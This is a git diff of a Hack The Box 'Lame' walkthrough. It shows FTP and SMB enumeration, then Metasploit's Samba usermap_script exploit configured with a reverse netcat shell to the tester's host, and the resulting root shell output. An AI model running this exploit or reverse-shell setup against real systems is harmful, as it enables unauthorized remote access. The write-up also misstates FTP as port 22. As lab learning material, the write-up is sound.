@@ -68,7 +68,7 @@ Service detection performed. Please report any incorrect results at https://nmap
  Looking into recon I noticed two things.
 1. They have FTP ( Port : 22 ) open with *allow anonymous login*  . This means I can access their FTP without obtaining credentials and use **username: anonymous password: anonymous**. Anonymous login was successful, but nothing valuable was salvageable.   
 
-```bash
+```shell
 $ ftp target.htb                                                                      
 Connected to target.htb.
 220 (vsFTPd 2.3.4)
@@ -100,7 +100,7 @@ ftp>
 	- What is Samba ? [Here is the official doc](https://www.samba.org/samba/what_is_samba.html). It's a software that allows Unix-like OS to communicate with SMB 
 	- I initially tried `smbclient` to see if there is anything worth to deepdive. I found a `sharename` called `tmp` with `oh noes!` comment, which looked suspicious.
 
-```bash
+```shell
 $ smbclient -L target.htb      
 Password for [WORKGROUP\kali]:
 Anonymous login successful
@@ -131,42 +131,104 @@ smb: \> ls
   vgauthsvclog.txt.0                  R     1600  Mon Sep 16 00:07:38 2024
 
         ---------            -------
-
         Workgroup            Master
         ---------            -------
         WORKGROUP            LAME
 ```
 
+I then tried Metasploit to check if there is any related vulnerabilities. This led me to `usermap_script command exploitation` via Samba.
+
+```shell
+msf6 > search samba 3.0.20
+
+Matching Modules
+================
+
+   #  Name                                Disclosure Date  Rank       Check  Description
+   -  ----                                ---------------  ----       -----  -----------
+   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution
+
+```
 ## Exploitation
 
-* **Gaining Initial Access:**
-    * Step-by-step explanation of how you exploited the vulnerability to gain initial access to the machine.
-    * ```
-      [Include any relevant code snippets or commands used]
-      ```
-* **Privilege Escalation (if applicable):**
-    * Describe the privilege escalation technique used.
-    * Provide details of any exploits or misconfigurations leveraged.
-* **Proof of Access:**
-    * ![Screenshot of flags or other evidence]
+After choosing the module, I had to change the **RHOST to the target ip , RPORT to 445, LHOST to tun0 (my IP)** for exploitation setting
+		* **NOTE** : You cannot use host file alias (target.htb) for RHOSTS. You must use the actual IP address. 
 
-## Post-Exploitation
+```shell
+msf6 exploit(multi/samba/usermap_script) > show options
 
-* **Further Enumeration:**
-    * Any additional information gathered after gaining access (interesting files, configurations, etc.).
-* **Lateral Movement (if applicable):**
-    * Explain how you moved to other machines on the network (if any).
+Module options (exploit/multi/samba/usermap_script):
 
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   CHOST                     no        The local client address
+   CPORT                     no        The local client port
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS   10.129.232.110       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT    445              yes       The target port (TCP)
+
+
+Payload options (cmd/unix/reverse_netcat):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.14.2       yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+```
+
+After running the `exploit`command, i was able to access target machine.
+
+```shell
+msf6 exploit(multi/samba/usermap_script) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.2:4444 
+[*] Command shell session 2 opened (10.10.14.2:4444 -> 10.129.232.110:46540) at 2024-09-16 16:01:27 +0900
+
+ls
+bin
+boot
+cdrom
+dev
+etc
+home
+initrd
+initrd.img
+initrd.img.old
+lib
+lost+found
+media
+mnt
+nohup.out
+opt
+proc
+root
+sbin
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+vmlinuz.old
+```
+
+The flag can be found on both `root` and `home>makis` with the name `user.txt` and `root.txt`
 ## Lessons Learned
 
-* Key takeaways from the challenge.
-* What you learned about the specific vulnerabilities or techniques used.
-* Any areas where you could have improved your approach.
+* Read the description on HTB carefully. This would sometime give you hint and don't think looking description is cheating. User every bit of given information.
+* `Samba` allows UNIX os to interconnect with SMB
+* Metasploit cannot use alias for RHOSTS. Use IP
 
 ## Conclusion
 
-* Summarize your overall experience with the machine.
-* Highlight the challenges you faced and how you overcame them.
-* Offer any advice to others attempting the same machine.
+* The machine is relatively easy and good beginner starter.
+* A good example not to overthink
 
 **Happy hacking!**
